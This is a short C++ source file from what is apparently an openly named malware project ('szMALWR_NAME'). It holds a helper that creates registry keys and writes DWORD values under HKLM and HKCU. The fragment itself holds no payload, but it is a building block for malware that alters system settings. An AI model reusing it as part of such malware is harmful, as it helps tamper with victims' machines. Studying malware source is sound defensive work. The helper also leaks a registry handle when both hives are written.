#include "../../../HeaderFiles/N0TiLLerka.h"

BOOL fnCreateRegistryKeyW(
	_In_ BOOL hKeyOpt,
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwType,
	_In_ DWORD dwValue
) {
	HKEY hKey = NULL;
	BOOL bReturn = FALSE;

	if (hKeyOpt & HKLM) {
		if (!RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)) {
			if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (PBYTE)&dwValue, sizeof(DWORD))) {
				bReturn |= HKLM;
			} else {
#ifdef DEBUG_MSG
				fnErrorHandlerW(L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
					L"RegSetValueExW", MB_OK | MB_ICONWARNING, dwType, lpValueName, dwValue);
#endif // DEBUG_MSG
			}
		} else {
#ifdef DEBUG_MSG
			fnErrorHandlerW(L"Couldn't create Registry Key\nKey: %s", NULL, L"RegCreateKeyExW", MB_OK | MB_ICONWARNING, lpSubKey);
#endif // DEBUG_MSG
		}
	}

	if (hKeyOpt & HKCU) {
		if (!RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)) {
			if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (PBYTE)&dwValue, sizeof(DWORD))) {
				bReturn |= HKCU;
			} else {
#ifdef DEBUG_MSG
				fnErrorHandlerW(L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
					L"RegSetValueExW", MB_OK | MB_ICONERROR, dwType, lpValueName, dwValue);
#endif // DEBUG_MSG
			}
		} else {
#ifdef DEBUG_MSG
			fnErrorHandlerW(L"Couldn't create Registry Key\nKey: %s", NULL, L"RegCreateKeyExW", MB_OK | MB_ICONWARNING, lpSubKey);
#endif // DEBUG_MSG
		}
	}

	RegCloseKey(hKey);
	return bReturn;
}